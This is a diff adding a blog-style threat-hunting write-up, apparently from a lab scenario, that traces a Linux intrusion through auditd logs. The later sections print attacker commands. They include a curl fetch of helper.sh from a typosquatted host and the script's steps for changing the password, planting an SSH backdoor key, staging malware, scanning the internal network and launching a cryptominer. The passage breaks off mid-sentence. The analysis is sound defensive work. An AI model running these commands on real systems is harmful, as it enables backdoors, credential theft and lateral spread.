@@ -1,0 +1,971 @@
+---
+title: "Investigating a Spike in Discovery Commands on Linux"
+category: "THREAT HUNTING"
+description: "Analyzing a SIEM alert triggered by discovery activity after 
+the itsupport user executed the hostname command, tracing the sequence of 
+events to uncover what occurred."
+thumbnail: "/discovery_alert.svg"
+date: "May 2026"
+classification: "Technical / Incident Investigation"
+challenge: "SOC Investigation"
+analyst: "Kamau James Kimani"
+tags:
+  [
+    "Linux",
+    "SIEM",
+    "Threat Hunting",
+    "Discovery Commands",
+    "SOC",
+    "Incident Response",
+    "Blue Team",
+  ]
+status: "Completed"
+---
+
+## Executive Summary
+
+Investigated suspicious process activity on a compromised Linux endpoint 
+by analysing auditd logs. The goal was to identify what scripts were 
+executed, how they were introduced, and what commands they ran.
+
+<Callout type="key">
+  **KEY INSIGHT:** auditd captures every `execve` syscall at the kernel 
+  level. Shell history can be deleted. auditd logs cannot be tampered 
+  with from userspace. That asymmetry is what makes this the ground 
+  truth of what actually ran on a system.
+</Callout>
+
+---
+
+## Stats at a Glance
+
+| Metric | Value |
+|---|---|
+| Scripts identified | 3 |
+| Remote downloads | 1 |
+| Primary tool | ausearch |
+| Key syscall | EXECVE |
+
+---
+
+## Investigation Approach
+
+Personally, I like to visually explore the data and get to know the 
+specific fields I will be dealing with. This approach allows me to 
+apply filters to fields of interest. The command to display the data 
+varies depending on the tool and the type of logs being handled.
+
+For this case, since I was dealing with Linux logs and the auditd tool, 
+some experience with `grep` and `awk` proved pivotal — especially when 
+creating temporary tables with fields of interest.
+
+To visualize the log I used `ausearch -i -if` followed by the path to 
+where the logs are located.
+
+```c
+-i    → interpret results (makes output human-readable)
+-if   → allocate the file ausearch is supposed to read
+```
+
+![log fuzzing](/log-fuzzing.png)
+
+By skimming through the command output, some fields caught my attention. 
+Some were new to me and required additional research. Fields like 
+**EXECVE**, **PPID**, **PID**, and **proctitle** I had covered earlier 
+in this [case study](https://soc-portfolio-website-a88y.vercel.app/case-studies/understanding-syscalls).
+
+Here is a summary of each field I interacted with:
+
+| Field | Meaning |
+|---|---|
+| `a0` | The binary or interpreter that was executed |
+| `a1` | The first argument passed — often the script name |
+| `a2`, `a3` | Further arguments (flags, URLs, paths) |
+| `argc` | Total number of arguments including `a0` |
+| `cwd` | Current working directory at time of execution |
+| `proctitle` | Full human-readable command as executed |
+| `ppid` / `pid` | Parent and child process IDs — trace the chain |
+| `auid` | Audit UID — the original logged-in user, even after `su` |
+
+<Callout type="key">
+  **CWD is the key to resolving relative paths.** If `a1=debug.sh` has 
+  no leading slash, the `cwd` field tells me the directory it ran from — 
+  giving me the full absolute path.
+</Callout>
+
+---
+
+## Section 1 — Investigation Walkthrough
+
+### Phase 1: Identifying the Script
+
+Identifying the script was my entry point to this investigation, as it 
+was the alert the SIEM raised. I prefer starting from the known and 
+working toward the unknown rather than hunting blindly. To filter for 
+the script I used the **proctitle** field alongside some filters. The 
+reason for choosing `proctitle` is straightforward — it displays the 
+full human-readable command that was executed. For the filters I 
+included extensions such as `.py`, `.pl`, `.rb`, and `.sh`.
+
+```c
+ausearch -i -x "proctitle=" | grep -E "\.(sh|py|pl|rb|bash)"
+```
+
+The `-E` flag enables extended regular expressions, allowing the use 
+of the `|` (OR) operator without excessive escaping. 
+`\.(sh|py|pl|rb|bash)` matches a literal dot `.` followed by any of 
+the listed extensions (shell, Python, Perl, Ruby, bash).
+
+The above command did not match anything in the logs.
+
+![no Matches](/no-match.png)
+
+At this point I began hunting the script manually by looking for 
+individual phrases in the logs. With `python`/`py`, `perl`/`pl`, and 
+`rb` I got nothing, but searching for `bash`/`sh` produced results.
+
+Logs containing the `bash` keyword were displayed, and after inspecting 
+both the first and second arguments I noticed this pattern: 
+`argc=2 a0=bash a1=debug.sh`. The current working directory and 
+`syscall=execve` were also worth noting. All `syscall=execve` calls 
+showed `success=yes`, confirming that the script execution completed 
+successfully.
+
+`subj=unconfined` indicates that AppArmor is not enforcing on these 
+processes. SELinux and AppArmor are Mandatory Access Control (MAC) 
+security frameworks for Linux and act as an extra layer of security 
+on top of standard Linux file permissions.
+
+#### How Normal Linux Permissions Work (Without MAC)
+
+```c
+User → Has root or file permission? → YES → Access granted
+```
+
+If a process runs as root, it can do almost anything.
+
+#### What MAC Adds
+
+```c
+User → Has permission? → YES → Does policy ALSO allow it? → YES → Access granted
+```
+
+Even root can be restricted. A compromised service cannot escape its 
+defined boundaries.
+
+![Pattern recognition](/pattern-recognition.png)
+
+In both Linux and Windows, understanding the concept of parent-child 
+relationships between processes is crucial. It allows one to visualise 
+what happened and what spawned what. In Windows an external tool such 
+as Process Hacker is needed, but in Linux commands like `pstree` or 
+the `/proc` virtual filesystem can be used.
+
+To hunt for PID 3759 I issued:
+
+```c
+pstree 3759
+```
+
+I got nothing. I even checked whether the command was installed on the 
+system. It then occurred to me that I was interacting with a log file 
+and not a live operating system.
+
+![mistake 1](/mistake_1.png)
+
+I went back to using **ausearch** and queried the PID directly:
+
+```c
+ausearch -i --pid 3759
+```
+
+<Callout type="key">
+  **KEY INSIGHT:** The reason for searching by `pid` rather than `ppid` 
+  3759 is that searching by `ppid=3759` returns the same log seen 
+  earlier. The workaround is to look for instances where the parent 
+  process was itself a child of another process.
+</Callout>
+
+![pid filter results](/pid-filter-1.png)
+
+From the output I could see the process had a parent that spawned it. 
+From the first argument `a0=-bash` and `tty=pts2` I confirmed that 
+the malicious activity was carried out through an interactive shell 
+and that access to the system was via a remote terminal session, not 
+a physical console. The next step was to move one level higher and 
+examine the parent of this process by filtering for `ppid=3758`.
+
+```c
+ausearch -i --ppid=3758
+```
+
+![repeated pattern](/pettern-repeate2.png)
+
+The above filter showed a repeated pattern observed earlier — the 
+current working directory `cwd=/home/itsupport` — and the return 
+was the exact same audit record as `pid 3759`.
+
+<Callout type="key">
+  **KEY INSIGHT:** Querying by `ppid=3758` returns only PID 3759 as 
+  its child.
+</Callout>
+
+| Finding | Significance |
+|---|---|
+| PID 3758 spawned only one child — PID 3759 | No other suspicious processes branched from it |
+| Both queries (pid & ppid) return the same record | The audit trail is consistent, no gaps |
+| PID 3758 itself has no audit record of its own | Not captured by execve auditing — may have existed before audit logging began, or is a process that did not trigger an exec call |
+
+### The Critical Gap — PID 3758 Is a Ghost Process
+
+```c
+PID 3758 → spawned → PID 3759 (bash, itsupport) → ran → debug.sh
+The question that remains: what is this process?
+```
+
+PID 3758 having no audit record suggests it could be:
+
+- An SSH daemon (`sshd`) that handled the incoming connection
+- A persistent backdoor or reverse shell that pre-dated audit logging
+- A process that spawned bash without using `execve` (evasion technique)
+
+From here I had two options:
+
+```c
+# 1. Check SSH daemon logs or filter for SSH in the log file
+# 2. Examine the script found earlier
+```
+
+The next step was to run `sudo cat /home/itsupport/debug.sh`. The 
+script itself was not overtly malicious — it resembled a legitimate 
+IT diagnostic tool based on the commands it contained. One rule of 
+thumb I learned in threat hunting is to verify everything. The 
+comments and commands used can be social engineering designed to 
+discourage inspection.
+
+![discovery script](/discovery-script.png)
+
+At this point I became uncertain about where to go next. I realised 
+I was hunting with limited clues and needed a clearer path. In threat 
+hunting, mapping each finding to the MITRE ATT&CK framework is crucial 
+because all attacks follow a predefined path — what changes is the 
+techniques and tools used. I decided to map everything found so far.
+
+The discovery commands observed mapped directly to the Discovery tactic: 
+`T1083`, `T1057`, and `T1082`. At this stage, adversaries gather 
+information about the system that could be used to identify potential 
+data to collect.
+
+It was at this point I discovered that the SIEM rules needed fine-tuning. 
+The rules had missed the initial access phase entirely and only triggered 
+at the discovery phase. I needed to go back into the logs and dig deeper 
+on `ssh` and `hostname`. The presence of `tty=pts2` confirmed the 
+activity was carried out through an interactive shell via a remote 
+terminal session, not a physical console.
+
+This allowed me to pivot the investigation toward filtering for 
+`hostname` and `sshd`.
+
+---
+
+### Phase 2: Tracing Initial Access — SSH & Hostname Pivot
+
+To investigate the SSH activity I issued:
+
+```c
+ausearch -i -x "ssh"
+```
+
+This returned two distinct sessions that told two very different stories.
+
+![filtering for ssh](/filtering-ssh.png)
+![filtering for ssh 2](/filtering-ssh2.png)
+
+#### Session 1 — Successful Login (18:29:36)
+
+| Field | Value |
+|---|---|
+| PID | 3691 |
+| Account | `itsupport` |
+| Source IP | `10.14.105.255` |
+| Terminal | `pts/2` |
+| Session | `ses=170` |
+| Result | `res=success` |
+| Auth Method | `pam_permit, pam_cap` |
+
+This was the session that spawned PID 3759 and executed `debug.sh` — 
+confirming this as the attacker's initial foothold.
+
+#### Session 2 — Failed Login (18:43:50)
+
+The same source IP `10.14.105.255` attempted to authenticate as the 
+`ubuntu` account and failed. This was significant — the same attacker 
+IP that successfully logged in as `itsupport` was now attempting to 
+move laterally into the `ubuntu` account.
+
+To sharpen the picture I piped the output through `grep` filters:
+
+```c
+ausearch -i -x "ssh" | grep -i "terminal=ssh"
+ausearch -i -x "ssh" | grep -i "res=failed"
+```
+
+This revealed a rapid sequence of failures against the `ubuntu` account 
+between `18:43:50` and `18:45:19` — all from `10.14.105.255`. The 
+speed and pattern confirmed automated credential stuffing, not manual 
+attempts.
+
+![session 2 failed login](/session-2-failed-login.png)
+
+---
+
+### Phase 3: External Brute Force — Broader Hostname Analysis
+
+Pivoting further, I searched the scenario audit log filtering on hostname:
+
+```c
+ausearch -i -if /home/ubuntu/scenario/audit.log | grep -i "hostname"
+```
+
+![filtering for hostname](/hostname-filtering.png)
+
+This exposed a completely separate wave of attack activity originating 
+from external IPs:
+
+| IP Address | Behaviour | Target Account |
+|---|---|---|
+| `195.24.207.223` | Rapid repeated failures | `root` |
+| `155.94.170.106` | Intermittent failures | `root` |
+| `101.126.145.188` | `acct=(invalid user)` — username enumeration | Unknown |
+| `45.9.148.125` | **Successful login** | `root` |
+
+To isolate failures and successes cleanly I used `awk` to print only 
+the fields of interest:
+
+```c
+ausearch -i -if /home/ubuntu/scenario/audit.log | grep -i "res=failed" \
+  | awk '{print $1, $2, $3, $12, $13, $14, $15, $16, $17, $18, $19}'
+
+ausearch -i -if /home/ubuntu/scenario/audit.log | grep -i "res=success" \
+  | awk '{print $1, $2, $3, $12, $13, $14, $15, $16, $17, $18, $19}'
+```
+
+![awk filter](/adding-awk-filter.png)
+
+To get a clearer picture of what was happening, I filtered for each IP 
+address individually and observed the associated log fields. I also 
+checked each IP on VirusTotal to gain a broader perspective. The key 
+question was whether these IPs had been flagged previously by other 
+security vendors.
+
+Security vendors including ADMINUsLabs, CRDF, G-Data, and 
+alphaMountain.ai had flagged the IPs. One tag that stood out was 
+`suspicious-udp` — a label that often points to scanning or 
+amplification activity rather than a classic SSH brute-force source.
+
+![virustotal analysis report for 195.24.207.223](/virus-total_1.png)
+![virus total analysis for 155.94.170.106](/virus-total_2.png)
+![virus total analysis for 101.126.145.188](/virus-total_3.png)
+
+Tracking each IP's activity window across the logs produced the 
+following timeline:
+
+- `195.24.207.223` — failed attempts from `21:13:17` to `21:16:07`
+- `155.94.170.106` — failed attempts from `21:13:25` to `21:15:22`
+- `101.126.145.188` — failed attempts from `21:13:36` to `21:15:08`
+- `45.9.148.125` — successful login observed between `21:13:33` and 
+  `21:14:29`, with the session fully established and hostname resolved 
+  — unlike the other IPs
+
+#### Reconstructing Events Chronologically
+
+| Time | IP | Event |
+|---|---|---|
+| 21:13:17 | 195.24.207.223 | Failed SSH attempts begin |
+| 21:13:25 | 155.94.170.106 | Failed SSH attempts begin |
+| 21:13:33 | 45.9.148.125 | Successful root authentication |
+| 21:13:36 | 101.126.145.188 | Failed SSH attempts begin |
+| 21:14:29 | 45.9.148.125 | Session fully established |
+| 21:15:08 | 101.126.145.188 | Failed attempts stop |
+| 21:15:22 | 155.94.170.106 | Failed attempts stop |
+| 21:16:07 | 195.24.207.223 | Failed attempts stop |
+
+All three failing IPs began authentication attempts within seconds of 
+each other — behaviour not typical of humans. This pattern resembled a 
+distributed brute-force campaign, supported further by the fact that 
+the IPs originated from different countries (Cameroon, China, and the 
+USA). Another indicator supporting this was that the brute force 
+continued even after the system was compromised — consistent with 
+automated bots working through wordlists independently of any operator.
+
+#### The Root Compromise — `45.9.148.125`
+
+At `21:13:33` the IP `45.9.148.125` successfully authenticated as 
+**root** via SSH and was assigned terminal `pts/1`. Within seconds, 
+three corroborating audit events confirmed the session:
+
+- `USER_AUTH` — authentication granted
+- `USER_LOGIN` — session opened on `pts/1`
+- `CRED_REFR` — credentials refreshed, session established
+
+`pts` stands for Pseudo Terminal Slave — a virtual terminal created 
+by the Linux kernel to represent a remote or non-physical terminal 
+session. When someone connects remotely via SSH, the kernel creates 
+a master/slave pair: the PTM (Pseudo Terminal Master) is the SSH 
+daemon side managing the connection, and the PTS is the user-facing 
+shell side that appears in logs.
+
+The terminal number also matters:
+
+| Terminal | Meaning |
+|---|---|
+| `pts/0` | First remote session opened |
+| `pts/1` | Second remote session — root attacker session |
+| `pts/2` | Third remote session — `itsupport` session |
+| `pts/3` | Fourth remote session — `ubuntu` user session |
+
+```c
+tty=(none)  → background/daemon process, no terminal attached
+tty=pts/N   → interactive remote session (SSH)
+tty=ttyN    → physical local console
+tty=cron    → scheduled task, no terminal
+```
+
+What followed at `21:15:01` was the most alarming entry — a `CRED_REFR` 
+event triggered not by `sshd` but by **cron**, with `terminal=cron`. 
+This indicated the attacker had planted a cron-based persistence 
+mechanism within two minutes of gaining root access.
+
+<Callout type="key">
+  **KEY INSIGHT:** The cron event at 21:15:01 firing within 2 minutes 
+  of root login is a strong indicator of automated persistence 
+  deployment. Attackers commonly pre-stage cron payloads that activate 
+  immediately upon gaining the required privilege level.
+</Callout>
+
+I attempted to filter for cron `execve` calls to identify what binary 
+or script it launched, but got nothing. I also tried to reconstruct 
+the process tree downward and check for a modified crontab — both 
+hit dead ends. I then broadened the search by filtering for all logs 
+associated with session 40.
+
+```c
+ausearch -i -if /home/ubuntu/scenario/audit.log | grep -i "ses=40"
+```
+
+The output revealed a story I had been missing. Extracting all `comm=` 
+values from the output revealed a clear execution sequence.
+
+![first phase of session 40](/session-40-commands_1.png)
+![second phase of session 40](/session-40-commands_2.png)
+![third phase of session 40](/session-40-command_3.png)
+
+| Order | Command | Binary | Purpose |
+|---|---|---|---|
+| 1 | `sh` | `/usr/bin/dash` | Shell spawned — session starts |
+| 2 | `env` | `/usr/bin/env` | Environment enumeration |
+| 3 | `run-parts` | `/usr/bin/run-parts` | Executes scripts in a directory |
+| 4 | `00-header` | `/usr/bin/dash` | MOTD header script |
+| 5 | `uname` | `/usr/bin/uname` | OS/kernel fingerprinting |
+| 6 | `landscape-sy` | `/usr/bin/dash` | System info script |
+| 7 | `find` | `/usr/bin/find` | File/directory search |
+| 8 | `cat` | `/usr/bin/cat` | File reading |
+| 9 | `50-motd-news` | `/usr/bin/dash` | MOTD news script |
+| 10 | `85-fwupd` | `/usr/bin/dash` | Firmware update check |
+| 11 | `90-updates-avai` | `/usr/bin/dash` | Available updates check |
+| 12 | `grep` | `/usr/bin/grep` | Pattern searching |
+| 13 | `stat` | `/usr/bin/stat` | File metadata inspection |
+| 14 | `awk` | `/usr/bin/gawk` | Text processing |
+| 15 | `date` | `/usr/bin/date` | Timestamp retrieval |
+| 16 | `98-reboot-requi` | `/usr/bin/dash` | Reboot required check |
+| 17 | `update-motd-reb` | `/usr/bin/dash` | MOTD update script |
+| 18 | `bash` | `/usr/bin/bash` | New bash shell spawned |
+| 19 | `sftp-server` | `/usr/lib/openssh/sftp-server` | SFTP server launched |
+| 20 | `cut` | `/usr/bin/cut` | Text field extraction |
+| 21 | `id` | `/usr/bin/id` | Identity/privilege check |
+| 22 | `release-upgrade` | `/usr/bin/dash` | Release upgrade check |
+| 23 | `92-unattended-u` | `/usr/bin/dash` | Unattended upgrades script |
+| 24 | `update-motd-una` | `/usr/bin/dash` | MOTD unattended update |
+| 25 | `95-hwe-eol` | `/usr/bin/dash` | Hardware enablement check |
+| 26 | `expr` | `/usr/bin/expr` | Expression evaluation |
+| 27 | `find` | `/usr/bin/find` | Second file search |
+
+#### What This Sequence Reveals
+
+**Part 1 — MOTD Execution (Automatic on Login)**
+
+```c
+sh → env → run-parts → 00-header → uname → landscape-sy
+     50-motd-news → 85-fwupd → 90-updates-avai
+     98-reboot-requi → update-motd-reb
+```
+
+Everything from `run-parts` through the numbered MOTD scripts 
+(`00-`, `50-`, `85-`, `90-`, `98-`) is standard Ubuntu login 
+behaviour. The system automatically runs these when a user logs 
+in via SSH. This is normal and expected.
+
+**Part 2 — Reconnaissance Begins**
+
+```c
+find → cat → grep → stat → awk → date → cut → uname → hostname
+```
+
+At the very end of the logs returned by the `ses=40` filter, a 
+critical event appeared:
+
+![sftp bash spawned](/sftp-bash.png)
+
+```c
+bash → sftp-server
+```
+
+`comm=bash` indicated a new bash shell was spawned within the session, 
+suggesting either a script took over execution or the attacker 
+deliberately dropped into an interactive bash shell.
+
+<Callout type="key">
+  **KEY INSIGHT:** The SFTP server was invoked interactively within 
+  the attacker's session. This strongly indicates the attacker used 
+  SFTP to transfer files to or from the system — either uploading 
+  tools and payloads, or exfiltrating data.
+</Callout>
+
+Filtering for any SFTP activity in the logs:
+
+```c
+ausearch -i -if /home/ubuntu/scenario/audit.log | grep "sftp"
+```
+
+The log returned:
+
+```c
+proctitle=bash -c /usr/lib/openssh/sftp-server
+argc=3  a0=bash  a1=-c  a2=/usr/lib/openssh/sftp-server
+exe=/usr/lib/openssh/sftp-server
+ppid=5440  pid=5485
+ses=40  auid=root  uid=root
+syscall=execve  success=yes
+```
+
+The presence of the `-c` flag proved that bash was told to execute 
+a specific command string directly. This was not a standard 
+system-initiated SFTP daemon. Recognising the difference between 
+normal and abnormal requires knowing what each looks like. A standard 
+SFTP session is initiated by `sshd` directly — no bash wrapper, no 
+`-c` flag. What appeared here was someone picking up the SFTP binary 
+themselves and running it manually.
+
+---
+
+### Phase 6: Command Summary — Getting the Full Picture
+
+At this point the `ses=40` filters were returning limited results. 
+Most queries had no matches, and the one `syscall=write` that returned 
+belonged to `sshd` itself — not a file operation. The file descriptor 
+it was writing to was `fd=3`, an open socket or pipe, and only 1 byte 
+was written. This is internal SSH protocol communication, not file I/O.
+
+<Callout type="key">
+  **KEY INSIGHT:** File descriptors 0, 1, and 2 are stdin, stdout, and 
+  stderr. `fd=3` is the first opened resource — in SSH context this is 
+  almost always the network socket. Writing 1 byte to a socket is a 
+  protocol handshake, not a file write. To learn more about file 
+  descriptors and syscalls, check this 
+  [case study](https://soc-portfolio-website-a88y.vercel.app/case-studies/understanding-syscalls).
+</Callout>
+
+Rather than continuing to filter blindly, I stepped back and pulled 
+a high-level summary of every command that executed across the entire 
+audit log:
+
+```c
+aureport --comm --summary -i
+```
+
+The `--comm` flag reports on commands, `--summary` aggregates by 
+frequency, and `-i` interprets the output into human-readable form. 
+This gave a ranked view of every binary that fired on the system, 
+sorted by execution count.
+
+#### Full Command Summary
+
+| Count | Command | Classification |
+|---|---|---|
+| 12 | `uname` | 🔴 Recon — OS/kernel fingerprinting |
+| 11 | `grep` | 🟡 Dual-use — searching |
+| 10 | `cat` | 🟡 Dual-use — file reading |
+| 10 | `cloud-id` | ⚪ System — cloud metadata query |
+| 9 | `cut` | 🟡 Dual-use — field extraction |
+| 8 | `env` | 🟡 Dual-use — environment enumeration |
+| 8 | `egrep` | 🟡 Dual-use — pattern searching |
+| 6 | `sshd` | ⚪ System — SSH daemon |
+| 6 | `find` | 🔴 Recon — filesystem search |
+| 6 | `head` | 🟡 Dual-use — file reading |
+| 6 | `date` | ⚪ System — timestamp |
+| 6 | `tar` | 🔴 Suspicious — archiving/packaging |
+| 5 | `systemd` | ⚪ System — init system |
+| 5 | `systemctl` | 🟡 Dual-use — service management |
+| 5 | `tr` | 🟡 Dual-use — text transformation |
+| 4 | `sh` | 🟡 Dual-use — shell execution |
+| 4 | `id` | 🔴 Recon — privilege check |
+| 4 | `stat` | 🟡 Dual-use — file metadata |
+| 4 | `dpkg` | 🟡 Dual-use — package enumeration |
+| 3 | `50-motd-news` | ⚪ System — MOTD script |
+| 3 | `awk` | 🟡 Dual-use — text processing |
+| 3 | `bash` | 🟡 Dual-use — shell |
+| 3 | `mktemp` | 🔴 Suspicious — temp file creation |
+| 2 | `wget` | 🔴 Suspicious — remote download |
+| 2 | `ps` | 🔴 Recon — process enumeration |
+| 2 | `cron` | 🔴 Suspicious — scheduled execution |
+| 2 | `sed` | 🟡 Dual-use — text manipulation |
+| 1 | `hostname` | 🔴 Recon — system identification |
+| 1 | `lscpu` | 🔴 Recon — CPU fingerprinting |
+| 1 | `uptime` | 🔴 Recon — uptime check |
+| 1 | `free` | 🔴 Recon — memory enumeration |
+| 1 | `df` | 🔴 Recon — disk enumeration |
+| 1 | `gzip` | 🔴 Suspicious — compression |
+| 1 | `rm` | 🔴 Suspicious — file deletion |
+| 1 | `curl` | 🔴 Suspicious — remote download |
+| 1 | `sudo` | 🔴 Suspicious — privilege escalation attempt |
+
+#### What the Summary Reveals
+
+**Finding 1 — Recon Commands Dominate the Top of the List**
+
+The most executed commands were all standard post-exploitation 
+reconnaissance tools. The volume of `uname` executions alone — 
+twelve times — was abnormal for routine system activity.
+
+**Finding 2 — `tar` and `gzip` Appeared**
+
+These archiving and compression utilities appearing in the log 
+strongly suggested the attacker was packaging files for exfiltration, 
+consistent with the SFTP activity observed in `ses=40`.
+
+**Finding 3 — `wget` and `curl` Both Appeared**
+
+Two separate download utilities were used. This indicated either 
+payload delivery or command-and-control communication.
+
+**Finding 4 — `rm` Appeared**
+
+File deletion after archiving is a classic anti-forensics step. 
+The attacker likely removed staged files after transfer to cover 
+their tracks.
+
+<Callout type="key">
+  **KEY INSIGHT:** The command summary turned a fragmented investigation 
+  into a coherent picture. Individual session filters were returning 
+  partial results, but the aggregate view revealed the full toolkit — 
+  recon, archiving, download, exfiltration, and cleanup — all present 
+  in a single audit log.
+</Callout>
+
+The next step was to pivot on the high-value suspicious commands — 
+specifically `wget`, `curl`, `tar`, `gzip`, and `rm` — to identify 
+exactly what was downloaded, what was archived, and what was deleted.
+
+---
+
+### Phase 7: Pivoting on Suspicious Commands — Downloads Exposed
+
+With the command summary showing `wget`, `curl`, `tar`, `gzip`, and 
+`rm` all present in the log, I pivoted on each one individually.
+
+```c
+ausearch -i -x "curl"
+ausearch -i -x "wget"
+```
+
+![curl and wget output](/curl-wget.png)
+
+#### `curl` — Malicious Download Confirmed
+
+The `curl` result returned one entry that was immediately alarming:
+
+```c
+proctitle=curl http://drobbox-online.thm/helper.sh -O /var/tmp/helper.sh
+argc=4  a0=curl  a1=http://drobbox-online.thm/helper.sh
+        a2=-O    a3=/var/tmp/helper.sh
+cwd=/home/ubuntu
+auid=ubuntu  uid=ubuntu  ses=174  tty=pts3
+time: 09/11/25 18:49:39
+```
+
+| Field | Value | Significance |
+|---|---|---|
+| Domain | `drobbox-online.thm` | Typosquat of Dropbox — fake domain mimicking legitimate cloud storage |
+| File | `helper.sh` | Generic name designed to look benign |
+| Flag `-O` | Save to disk | Explicitly downloading and writing the file |
+| Save path | `/var/tmp/helper.sh` | `/var/tmp` persists across reboots — chosen deliberately |
+| User | `ubuntu` | Different account from the root compromise — wider infection |
+| Session | `ses=174  tty=pts3` | Separate session from the attacker's root session |
+
+The domain `drobbox-online.thm` is a textbook typosquat — close enough 
+to `dropbox.com` to pass a casual glance but entirely attacker-controlled. 
+The save path was equally deliberate:
+
+```c
+/tmp     → cleared on reboot
+/var/tmp → persists across reboots  ← attacker's choice
+```
+
+#### `wget` — Two Downloads, One Legitimate
+
+The `wget` filter returned two separate entries.
+
+**Download 1 — Elastic Agent (18:30:48)**
+
+```c
+proctitle=wget https://artifacts.elastic.co/downloads/beats/
+          elastic-agent/elastic-agent-9.1.3-linux-x86_64.tar.gz
+cwd=/home/itsupport
+auid=itsupport  uid=itsupport
+ses=170  tty=pts2
+ppid=3759  pid=3787
+```
+
+![wget](/wget.png)
+
+This resolved the question about the Elastic Agent archive found 
+earlier in `/home/itsupport/`. It was not pre-installed — it was 
+downloaded by the attacker during the initial compromise session. 
+The `ppid=3759` confirmed it was a direct child of the suspicious 
+bash shell, and `ses=170` placed it firmly inside the original 
+foothold session.
+
+**Download 2 — MOTD Fetch (18:38:38)**
+
+```c
+proctitle=wget --timeout 60 -U wget/1.21.4 https://motd.ubuntu.com
+auid=unset  uid=root  ses=unset  tty=(none)
+ppid=3804  pid=3828
+```
+
+This second `wget` was legitimate — a standard Ubuntu MOTD update 
+triggered automatically on login. The indicators that distinguished 
+it from malicious activity:
+
+```c
+auid=unset   → no audit user — system-level process
+ses=unset    → no session — background daemon
+tty=(none)   → no terminal — automated call
+```
+
+<Callout type="key">
+  **KEY INSIGHT:** Knowing what normal looks like is what makes the 
+  abnormal visible. The MOTD wget and the drobbox wget both appeared 
+  in the same command summary, but their fields told completely 
+  different stories. `auid=unset`, `ses=unset`, and `tty=(none)` are 
+  the fingerprint of a legitimate system process. `auid=ubuntu`, 
+  `ses=174`, and `tty=pts3` are the fingerprint of an interactive 
+  human session.
+</Callout>
+
+#### Revised Attack Picture
+
+```c
+18:29:37 → itsupport SSH login (10.14.105.255)
+18:29:48 → debug.sh executed — recon begins
+18:30:48 → wget elastic-agent downloaded (itsupport, ses=170, ppid=3759)
+18:49:39 → curl drobbox-online.thm/helper.sh → /var/tmp/ (ubuntu, ses=174)
+21:13:33 → root login SUCCESS (45.9.148.125)
+21:14:28 → ses=40 — recon + sftp + tar/gzip activity
+21:15:01 → cron persistence triggered
+```
+
+Two things stood out from this updated view. First, the Elastic Agent 
+download happened within one minute of the initial bash shell spawn — 
+this was not exploration but a prepared, scripted action. Second, the 
+`helper.sh` download came from a completely different user account on 
+a different terminal, meaning the compromise had already spread beyond 
+`itsupport` nearly three hours before the root login occurred.
+
+The next step was to examine what `helper.sh` actually did.
+
+```c
+# Was helper.sh executed after download?
+ausearch -i -if /home/ubuntu/scenario/audit.log \
+  | grep -E "helper|var/tmp"
+
+# What did the ubuntu session do in full?
+ausearch -i -if /home/ubuntu/scenario/audit.log \
+  | grep "ses=174"
+```
+
+---
+
+### Phase 8: `helper.sh` — The Full Attack Revealed
+
+Examining the contents of `helper.sh` transformed the investigation 
+from a collection of suspicious indicators into a complete, named 
+attack chain. The script was not a generic backdoor — it was a 
+structured, multi-stage intrusion tool.
+
+```bash
+# Checks CPU and RAM information
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+lscpu | grep Model
+# Unclear purpose
+ls -lh $(which ls)
+# Generic Discovery
+crontab -l
+w
+uname -m
+```
+
+The script opened with hardware and system enumeration — consistent 
+with the recon commands seen throughout `ses=40` and the earlier 
+`debug.sh` execution. The attacker was profiling the system to 
+determine whether it was worth fully compromising.
+
+#### Stage 1 — Credential Manipulation
+
+```bash
+echo -e "ubuntu123\nN2a96PU0mBfS\nN2a96PU0mBfS"|passwd|bash
+```
+
+This single line attempted to change the current user's password by 
+piping credentials directly into `passwd`. The output was appended 
+to `up.txt` — a credentials file used in a later stage.
+
+| Element | Purpose |
+|---|---|
+| `ubuntu123` | Current password attempt |
+| `N2a96PU0mBfS` | New password being set |
+| `passwd\|bash` | Pipes result — ensures execution continues |
+| `>> up.txt` | Saves outcome to credentials file |
+
+#### Stage 2 — SSH Backdoor Implanted
+
+```bash
+cd ~
+rm -rf .ssh
+mkdir .ssh
+echo "ssh-rsa [ssh-key] mdrfckr" >> .ssh/authorized_keys
+chmod -R go= ~/.ssh
+```
+
+The attacker wiped the existing `.ssh` directory and replaced it with 
+one containing their own public key. The `chmod -R go=` removed all 
+group and other permissions — locking out everyone except the key holder.
+
+<Callout type="key">
+  **KEY INSIGHT:** The string `mdrfckr` appended to the SSH key as a 
+  comment is unique to this specific attack campaign. It acts as an 
+  attacker signature and is a known indicator of compromise for this 
+  malware family — searchable in threat intelligence platforms.
+</Callout>
+
+#### Stage 3 — Malware Staging
+
+```bash
+cd /tmp
+rm -rf .X2*
+mkdir .X26-unix
+cd .X26-unix
+tar xf dota3.tar.gz
+sleep 3s
+cd /tmp/.X26-unix/.rsync/c
+```
+
+| Action | Significance |
+|---|---|
+| `rm -rf .X2*` | Removes any prior infection or competing malware |
+| `mkdir .X26-unix` | Hidden directory — dot prefix conceals from casual `ls` |
+| `tar xf dota3.tar.gz` | Unpacks the malware archive |
+| `.rsync/c` | Disguised as rsync — a legitimate-looking folder name |
+
+The archive `dota3.tar.gz` was the malware payload. Its name was 
+deliberately chosen to appear as a gaming or system file. This also 
+connected directly back to the `tar ×6` and `gzip ×1` entries seen 
+in the `aureport` command summary.
+
+#### Stage 4 — Internal Network Scanning
+
+```bash
+nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 192.168 \
+  >> /dev/null 2>1&
+sleep 8m
+nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 172.16 \
+  >> /dev/null 2>1&
+sleep 20m
+```
+
+`tsm` was a credential-stuffing SSH scanner that used the `up.txt` 
+credentials file built in Stage 1 to attempt authentication against 
+every host on the internal network ranges.
+
+| Element | Purpose |
+|---|---|
+| `nohup` | Runs detached — survives terminal disconnect |
+| `-p 22` | Targets SSH port |
+| `/tmp/up.txt` | Credential list built from the passwd stage |
+| `>> /dev/null 2>1&` | Suppresses all output — silent execution |
+| `sleep 8m / 20m` | Staggers scans to avoid detection |
+
+The compromised host was now being used as a launchpad to attack other 
+machines on the same network using the credentials harvested from the 
+system itself.
+
+#### Stage 5 — Cryptominer Deployed
+
+```bash
+cd ..; nohup /tmp/.X26-unix/.rsync/initall 2>1&
+exit 0
+```
+
+The final payload was `initall` — a cryptominer disguised with a name 
+that mimicked a system initialisation binary. It ran detached via 
